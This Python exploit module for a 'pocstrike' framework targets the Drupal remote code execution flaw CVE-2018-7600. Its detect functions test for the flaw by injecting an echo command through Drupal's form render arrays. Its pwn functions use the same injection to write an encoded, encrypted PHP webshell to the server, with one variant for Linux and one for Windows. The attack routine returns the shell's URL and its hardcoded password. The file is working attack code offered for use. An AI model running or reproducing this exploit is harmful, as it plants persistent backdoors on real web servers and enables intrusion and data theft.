import re
from collections import OrderedDict
from bs4 import BeautifulSoup

from libs.pocstrike.api \
    import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE, get_listener_ip, get_listener_port, random_str
from libs.pocstrike.lib.core.interpreter_option \
    import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
from libs.pocstrike.modules.listener import REVERSE_PAYLOAD


class DemoPOC(POCBase):
    vulID = '2'
    version = '1'
    author = ''
    vulDate = '2021-04-30'
    createDate = '2021-04-30'
    updateDate = '2021-04-30'
    references = ['http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7600']
    name = 'Drupal remote code execute'
    appPowerLink = 'https://www.drupal.org/'
    appName = 'Drupal'
    appVersion = 'before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 '
    vulType = VUL_TYPE.REMOTE_CODE_EXECUTE
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    samples = []
    install_requires = ["beautifulsoup4==4.9.3:bs4"]
    desc = '''
            Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations.
        '''
    pocDesc = '''
            Incoming destination site
        '''

    def _options(self):
        opt = OrderedDict()
        return opt

    def _verify(self):
        output = Output(self)
        result = {}
        if self.url[-1] == '/':
            self.url = self.url[:-1]
        vulkey = self.detect_drupal_8(self.url)
        if vulkey:
            output.success(result)
        else:
            output.fail()
        return output

    def _attack(self):
        output = Output(self)
        result = {}
        if self.url[-1] == '/':
            self.url = self.url[:-1]
        shell_name = self.pwn_drupal_8(self.url)
        if shell_name:
            result = {
                'webshell_url': self.url + '/' + shell_name,
                'webshell_pass': 'rebeyond',
                "webshell_access_tool": "behinder"
            }
            output.success(result)
        else:
            output.fail("attack fail")
        return output

    def _shell(self):
        pass

    def detect_drupal_7(self, target):
        vulkey = random_str()
        get_params = {
            'q': 'user/password',
            'name[#post_render][]': 'passthru',
            'name[#type]': 'markup',
            'name[#markup]': 'echo ' + vulkey
        }
        post_params = {
            'form_id': 'user_pass',
            '_triggering_element_name': 'name',
            '_triggering_element_value': '',
            'opz': 'E-mail new Password'
        }
        r = requests.post(
            target,
            params=get_params,
            data=post_params,
            verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-pass'})
        form_build_id = form.find('input', {
            'name': 'form_build_id'
        }).get('value')
        if form_build_id:
            get_params = {'q': 'file/ajax/name/#value/' + form_build_id}
            post_params = {'form_build_id': form_build_id}
            r = requests.post(
                target,
                params=get_params,
                data=post_params,
                verify=False)
            if vulkey in r.text:
                return vulkey
            else:
                return None

    def detect_drupal_8(self, target):
        vulkey = random_str()
        url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        post_params = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'passthru',
            'mail[#type]': 'markup',
            'mail[#markup]': 'echo  ' + vulkey
        }
        r = requests.post(url, data=post_params)
        if vulkey in r.text:
            return vulkey
        else:
            return self.detect_drupal_7(target)

    def pwn_drupal_7(self, target):
        shell_name = random_str() + '.php'
        get_params_linux = {
            'q': 'user/password',
            'name[#post_render][]': 'passthru',
            'name[#type]': 'markup',
            'name[#markup]': 'echo PD9waHAgQGVycm9yX3JlcG9ydGluZyggMCApO3Nlc3Npb25fc3RhcnQoKTska2V5PSJlNDVlMzI5ZmViNWQ5MjViIjskX1NFU1NJT05bJ2snXT0ka2V5O3Nlc3Npb25fd3JpdGVfY2xvc2UoKTskcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTtpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKXskdD0iYmFzZTY0XyIuImRlY29kZSI7JHBvc3Q9JHQoJHBvc3QuIiIpO2ZvcigkaT0gMCA7JGk8c3RybGVuKCRwb3N0KTskaSsrKXskcG9zdFskaV09JHBvc3RbJGldXiRrZXlbJGkrIDEgJiAxNSBdO319ZWxzZXskcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsIkFFUzEyOCIsJGtleSk7fSRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOyRmdW5jPSRhcnJbIDAgXTskcGFyYW1zPSRhcnJbIDEgXTtjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCl7ZXZhbCgkcC4iIik7fX1AY2FsbF91c2VyX2Z1bmMobmV3IEMoKSwkcGFyYW1zKTs/Pg== | base64 -d >' + shell_name
        }
        get_params_windows = {
            'q': 'user/password',
            'name[#post_render][]': 'passthru',
            'name[#type]': 'markup',
            'name[#markup]': 'powershell.exe -command "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\'PAA/AHAAaABwACAAQABlAHIAcgBvAHIAXwByAGUAcABvAHIAdABpAG4AZwAoACAAMAAgACkAOwBzAGUAcwBzAGkAbwBuAF8AcwB0AGEAcgB0ACgAKQA7ACQAawBlAHkAPQAiAGUANAA1AGUAMwAyADkAZgBlAGIANQBkADkAMgA1AGIAIgA7ACQAXwBTAEUAUwBTAEkATwBOAFsAJwBrACcAXQA9ACQAawBlAHkAOwBzAGUAcwBzAGkAbwBuAF8AdwByAGkAdABlAF8AYwBsAG8AcwBlACgAKQA7ACQAcABvAHMAdAA9AGYAaQBsAGUAXwBnAGUAdABfAGMAbwBuAHQAZQBuAHQAcwAoACIAcABoAHAAOgAvAC8AaQBuAHAAdQB0ACIAKQA7AGkAZgAoACEAZQB4AHQAZQBuAHMAaQBvAG4AXwBsAG8AYQBkAGUAZAAoACcAbwBwAGUAbgBzAHMAbAAnACkAKQB7ACQAdAA9ACIAYgBhAHMAZQA2ADQAXwAiAC4AIgBkAGUAYwBvAGQAZQAiADsAJABwAG8AcwB0AD0AJAB0ACgAJABwAG8AcwB0AC4AIgAiACkAOwBmAG8AcgAoACQAaQA9ACAAMAAgADsAJABpADwAcwB0AHIAbABlAG4AKAAkAHAAbwBzAHQAKQA7ACQAaQArACsAKQB7ACQAcABvAHMAdABbACQAaQBdAD0AJABwAG8AcwB0AFsAJABpAF0AXgAkAGsAZQB5AFsAJABpACsAIAAxACAAJgAgADEANQAgAF0AOwB9AH0AZQBsAHMAZQB7ACQAcABvAHMAdAA9AG8AcABlAG4AcwBzAGwAXwBkAGUAYwByAHkAcAB0ACgAJABwAG8AcwB0ACwAIgBBAEUAUwAxADIAOAAiACwAJABrAGUAeQApADsAfQAkAGEAcgByAD0AZQB4AHAAbABvAGQAZQAoACcAfAAnACwAJABwAG8AcwB0ACkAOwAkAGYAdQBuAGMAPQAkAGEAcgByAFsAIAAwACAAXQA7ACQAcABhAHIAYQBtAHMAPQAkAGEAcgByAFsAIAAxACAAXQA7AGMAbABhAHMAcwAgAEMAewBwAHUAYgBsAGkAYwAgAGYAdQBuAGMAdABpAG8AbgAgAF8AXwBpAG4AdgBvAGsAZQAoACQAcAApAHsAZQB2AGEAbAAoACQAcAAuACIAIgApADsAfQB9AEAAYwBhAGwAbABfAHUAcwBlAHIAXwBmAHUAbgBjACgAbgBlAHcAIABDACgAKQAsACQAcABhAHIAYQBtAHMAKQA7AD8APgA=\')) | out-file -Encoding utf8 "' + shell_name
        }
        post_params = {
            'form_id': 'user_pass',
            '_triggering_element_name': 'name',
            '_triggering_element_value': '',
            'opz': 'E-mail new Password'
        }
        r = requests.post(
            target,
            params=get_params_linux,
            data=post_params,
            verify=False)
        soup = BeautifulSoup(r.text, "html.parser")
        form = soup.find('form', {'id': 'user-pass'})
        form_build_id = form.find('input', {
            'name': 'form_build_id'
        }).get('value')
        if form_build_id:
            get_params_linux = {'q': 'file/ajax/name/#value/' + form_build_id}
            post_params = {'form_build_id': form_build_id}
            r = requests.post(
                target,
                params=get_params_linux,
                data=post_params,
                verify=False)
            r = requests.get(target + '/' + shell_name)
            if r.status_code == 200:
                return shell_name
            else:
                r = requests.post(
                    target,
                    params=get_params_windows,
                    data=post_params,
                    verify=False)
                soup = BeautifulSoup(r.text, "html.parser")
                form = soup.find('form', {'id': 'user-pass'})
                form_build_id = form.find('input', {
                    'name': 'form_build_id'
                }).get('value')
                if form_build_id:
                    get_params_windows = {'q': 'file/ajax/name/#value/' + form_build_id}
                    post_params = {'form_build_id': form_build_id}
                    r = requests.post(
                        target,
                        params=get_params_windows,
                        data=post_params,
                        verify=False)
                    r = requests.get(target + '/' + shell_name)
                    if r.status_code == 200:
                        return shell_name
                    else:
                        return None

    def pwn_drupal_8(self, target):
        shell_name = random_str() + '.php'
        url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        post_params_linux = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'passthru',
            'mail[#type]': 'markup',
            'mail[#markup]': 'echo PD9waHAgQGVycm9yX3JlcG9ydGluZyggMCApO3Nlc3Npb25fc3RhcnQoKTska2V5PSJlNDVlMzI5ZmViNWQ5MjViIjskX1NFU1NJT05bJ2snXT0ka2V5O3Nlc3Npb25fd3JpdGVfY2xvc2UoKTskcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTtpZighZXh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKXskdD0iYmFzZTY0XyIuImRlY29kZSI7JHBvc3Q9JHQoJHBvc3QuIiIpO2ZvcigkaT0gMCA7JGk8c3RybGVuKCRwb3N0KTskaSsrKXskcG9zdFskaV09JHBvc3RbJGldXiRrZXlbJGkrIDEgJiAxNSBdO319ZWxzZXskcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsIkFFUzEyOCIsJGtleSk7fSRhcnI9ZXhwbG9kZSgnfCcsJHBvc3QpOyRmdW5jPSRhcnJbIDAgXTskcGFyYW1zPSRhcnJbIDEgXTtjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2ludm9rZSgkcCl7ZXZhbCgkcC4iIik7fX1AY2FsbF91c2VyX2Z1bmMobmV3IEMoKSwkcGFyYW1zKTs/Pg== | base64 -d | tee ' + shell_name
        }
        post_params_windows = {
            'form_id': 'user_register_form',
            '_drupal_ajax': '1',
            'mail[#post_render][]': 'passthru',
            'mail[#type]': 'markup',
            'mail[#markup]': 'powershell.exe -command "[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(\'PAA/AHAAaABwACAAQABlAHIAcgBvAHIAXwByAGUAcABvAHIAdABpAG4AZwAoACAAMAAgACkAOwBzAGUAcwBzAGkAbwBuAF8AcwB0AGEAcgB0ACgAKQA7ACQAawBlAHkAPQAiAGUANAA1AGUAMwAyADkAZgBlAGIANQBkADkAMgA1AGIAIgA7ACQAXwBTAEUAUwBTAEkATwBOAFsAJwBrACcAXQA9ACQAawBlAHkAOwBzAGUAcwBzAGkAbwBuAF8AdwByAGkAdABlAF8AYwBsAG8AcwBlACgAKQA7ACQAcABvAHMAdAA9AGYAaQBsAGUAXwBnAGUAdABfAGMAbwBuAHQAZQBuAHQAcwAoACIAcABoAHAAOgAvAC8AaQBuAHAAdQB0ACIAKQA7AGkAZgAoACEAZQB4AHQAZQBuAHMAaQBvAG4AXwBsAG8AYQBkAGUAZAAoACcAbwBwAGUAbgBzAHMAbAAnACkAKQB7ACQAdAA9ACIAYgBhAHMAZQA2ADQAXwAiAC4AIgBkAGUAYwBvAGQAZQAiADsAJABwAG8AcwB0AD0AJAB0ACgAJABwAG8AcwB0AC4AIgAiACkAOwBmAG8AcgAoACQAaQA9ACAAMAAgADsAJABpADwAcwB0AHIAbABlAG4AKAAkAHAAbwBzAHQAKQA7ACQAaQArACsAKQB7ACQAcABvAHMAdABbACQAaQBdAD0AJABwAG8AcwB0AFsAJABpAF0AXgAkAGsAZQB5AFsAJABpACsAIAAxACAAJgAgADEANQAgAF0AOwB9AH0AZQBsAHMAZQB7ACQAcABvAHMAdAA9AG8AcABlAG4AcwBzAGwAXwBkAGUAYwByAHkAcAB0ACgAJABwAG8AcwB0ACwAIgBBAEUAUwAxADIAOAAiACwAJABrAGUAeQApADsAfQAkAGEAcgByAD0AZQB4AHAAbABvAGQAZQAoACcAfAAnACwAJABwAG8AcwB0ACkAOwAkAGYAdQBuAGMAPQAkAGEAcgByAFsAIAAwACAAXQA7ACQAcABhAHIAYQBtAHMAPQAkAGEAcgByAFsAIAAxACAAXQA7AGMAbABhAHMAcwAgAEMAewBwAHUAYgBsAGkAYwAgAGYAdQBuAGMAdABpAG8AbgAgAF8AXwBpAG4AdgBvAGsAZQAoACQAcAApAHsAZQB2AGEAbAAoACQAcAAuACIAIgApADsAfQB9AEAAYwBhAGwAbABfAHUAcwBlAHIAXwBmAHUAbgBjACgAbgBlAHcAIABDACgAKQAsACQAcABhAHIAYQBtAHMAKQA7AD8APgA=\')) | out-file -Encoding utf8 "' + shell_name
        }
        r = requests.post(url, data=post_params_linux)
        r = requests.get(target + '/' + shell_name)
        if r.status_code == 200:
            return shell_name
        else:
            r = requests.post(url, data=post_params_windows)
            r = requests.get(target + '/' + shell_name)
            if r.status_code == 200:
                return shell_name
            else:
                return self.pwn_drupal_7(target)


register_poc(DemoPOC)
